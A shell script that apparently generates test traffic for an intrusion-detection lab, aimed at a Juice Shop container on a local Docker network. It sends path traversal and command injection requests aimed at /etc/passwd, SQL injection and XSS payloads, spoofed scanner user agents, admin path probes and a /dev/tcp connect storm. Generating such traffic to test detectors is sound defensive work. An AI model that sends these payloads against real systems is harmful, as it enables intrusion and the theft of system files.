#!/bin/sh
set -eu
TARGET="${TARGET:-http://juiceshop:3000}"
echo "[*] Local IDS lab attacker starting against $TARGET"
echo "[*] All traffic stays inside the Docker network. No external targets."

echo "[1] Benign GET /"
curl -sS -o /dev/null -w "HTTP %{http_code}\n" "$TARGET/" || true
sleep 0.5

echo "[2] Path traversal + ftp probe"
curl -sS -o /dev/null -w "HTTP %{http_code}\n" "$TARGET/ftp/../../etc/passwd" || true
curl -sS -o /dev/null -w "HTTP %{http_code}\n" "$TARGET/ftp" || true
sleep 0.5

echo "[3] SQL injection style queries (decoded chars in URI)"
curl -sS -o /dev/null -w "HTTP %{http_code}\n" \
  "$TARGET/rest/products/search?q='OR'1'='1" || true
curl -sS -o /dev/null -w "HTTP %{http_code}\n" \
  "$TARGET/rest/products/search?q=test'OR'1" || true
sleep 0.5

echo "[4] Scanner user-agents"
curl -sS -o /dev/null -w "HTTP %{http_code}\n" -A "Mozilla/5.0 (compatible; Nikto/2.1.6)" "$TARGET/" || true
curl -sS -o /dev/null -w "HTTP %{http_code}\n" -A "sqlmap/1.7.2 (http://sqlmap.org)" "$TARGET/" || true
sleep 0.5

echo "[5] Admin / challenges / metrics"
curl -sS -o /dev/null -w "HTTP %{http_code}\n" "$TARGET/administration" || true
curl -sS -o /dev/null -w "HTTP %{http_code}\n" "$TARGET/api/Challenges/?name=score-board" || true
curl -sS -o /dev/null -w "HTTP %{http_code}\n" "$TARGET/metrics" || true
sleep 0.5

echo "[6] XSS and command-injection style"
curl -sS -o /dev/null -w "HTTP %{http_code}\n" \
  "$TARGET/rest/products/search?q=<script>alert(1)</script>" || true
curl -sS -o /dev/null -w "HTTP %{http_code}\n" \
  "$TARGET/rest/products/search?q=;cat+/etc/passwd" || true

echo "[7] Connect storm"
i=0
while [ "$i" -lt 12 ]; do
  (echo > /dev/tcp/juiceshop/3000) >/dev/null 2>&1 || true
  i=$((i+1))
done

echo "[*] Attack script finished."
